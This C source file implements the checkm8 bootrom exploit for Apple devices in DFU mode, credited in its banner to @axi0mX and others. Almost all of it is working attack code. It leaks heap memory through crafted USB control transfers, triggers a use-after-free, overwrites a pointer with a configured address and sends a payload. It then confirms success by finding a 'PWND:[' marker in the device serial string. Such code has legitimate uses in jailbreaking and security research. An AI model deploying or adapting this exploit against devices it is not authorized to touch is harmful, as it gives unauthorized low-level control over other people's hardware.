#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>

#include "lilirecovery.h"
#include "config.h"

#define PWND_STR    "PWND:["
#define NONCE_MAX_SIZE  20

uint8_t current_nonce[NONCE_MAX_SIZE] = { 0 };
uint8_t empty[0x800] = { 0 };

static void usb_req_no_leak(irecv_client_t client) {
    irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, empty, 0x41, 1);
}

static void usb_req_leak(irecv_client_t client) {
    irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, empty, 0x40, 1);
}

static void usb_req_stall(irecv_client_t client) {
    irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, empty, 0x0, 10);
}

static void usb_reset(irecv_client_t client) {
    irecv_reset(client);
}

static bool check_device_pwnd(irecv_client_t client) {
    const struct irecv_device_info *info = irecv_get_device_info(client);
    return strstr(info->serial_string, PWND_STR) ? true : false;
}

static void close_device(irecv_client_t client) {
    irecv_close(client);
}

irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_nonce_verify, const exploit_config_t **config) {
    irecv_client_t client = NULL;
    bool connected = false;

#define ATTEMPT_PERIOD_USEC (500 * 1000)  

    for (int i = 0; i < attempts; i++) {
        if (irecv_open_with_ecid(&client, 0) == IRECV_E_SUCCESS) {
            connected = true;
            break;
        } else {
            usleep(ATTEMPT_PERIOD_USEC);
        }
    }

    if (!connected) {
        if (attempts == 1) {
            printf("failed to acquire device\n");
        } else {
            printf("failed to acquire device after %d attempts\n", attempts);
        }

        return NULL;
    }

    const struct irecv_device_info *info = irecv_get_device_info(client);
    if (!info) {
        printf("acquired device, but no info?!\n");
        goto fail;
    }

    if (!info->ap_nonce) {
        printf("acquired device, but no nonce?!\n");
        goto fail;
    }

    if (!need_nonce_verify) {
        memcpy(current_nonce, info->ap_nonce, NONCE_MAX_SIZE);
    } else {
        if (memcmp(current_nonce, info->ap_nonce, NONCE_MAX_SIZE) != 0) {
            printf("nonces do not match, device apparently rebooted\n");
            goto fail;
        }
    }

    if (need_found_report) {
        printf("found: %s\n", info->serial_string);
    }

    if (!info->srtg) {
        printf("not DFU mode\n");
        goto fail;
    }

    const exploit_config_t *curr = NULL;

    if (config) {
        curr = get_config(info->cpid);

        if (!curr) {
            printf("this platform is not supported\n");
            goto fail;
        }

        *config = curr;
    }

    return client;

fail:
    irecv_close(client);
    return NULL;
}

static void print_banner() {
    printf("***          checkm8 exploit by @axi0mX           ***\n");
    printf("*** s5l8747x/Haywire implementation by @a1exdandy ***\n");
    printf("***     libirecovery/iOS port by @nyan_satan      ***\n");
    printf("\n");
}

int main(void) {
    print_banner();

    const exploit_config_t *config = NULL;

    irecv_client_t device = acquire_device(1, true, false, &config);
    if (!device) {
        return -1;
    }

    if (check_device_pwnd(device)) {
        printf("device already pwned\n");
        return -1;
    }

    struct timeval st, et;
    gettimeofday(&st, NULL);

    printf("leaking...\n");

    usb_req_stall(device);
    for (int i = 0; i < config->large_leak; i++) {
        usb_req_leak(device);
    }
    usb_req_no_leak(device);

    usb_reset(device);
    close_device(device);

    device = acquire_device(10, false, true, NULL);
    if (!device) {
        return -1;
    }

    printf("triggering UaF...\n");

    int sent = irecv_usb_dummy_async_control_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
    irecv_usb_control_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
    close_device(device);

    device = acquire_device(10, false, true, NULL);
    if (!device) {
        return -1;
    }

    printf("sending payload...\n");

    usb_req_stall(device);
    usb_req_leak(device);

    size_t overwrite_size = config->overwrite_size - sent;
    off_t overwrite_addr_ptr = overwrite_size;
    overwrite_size += 4;

    if (config->needs_overwrite_suffix) {
        overwrite_size += 4;
    }

    uint8_t overwrite[overwrite_size];
    memset(overwrite, 0x0, sizeof(overwrite));
    *(uint32_t *)((uint8_t *)&overwrite + overwrite_addr_ptr) = config->overwrite_addr;

    irecv_usb_control_transfer(device, 0, 0, 0, 0, overwrite, overwrite_size, 100);
    irecv_usb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)config->payload, config->payload_len, 100);

    usb_reset(device);
    close_device(device);

    device = acquire_device(10, true, true, NULL);
    if (!device) {
        return -1;
    }

    if (!check_device_pwnd(device)) {
        printf("exploit failed\n");
        close_device(device);
        return -1;
    }

    gettimeofday(&et, NULL);
    long elapsed = ((et.tv_sec - st.tv_sec) * 1000000) + (et.tv_usec - st.tv_usec);
    float elapsed_sec = (float)elapsed / (1000 * 1000);

    printf("exploit success!\n");
    printf("took - %.2fs\n", elapsed_sec);

    close_device(device);

    return 0;
}
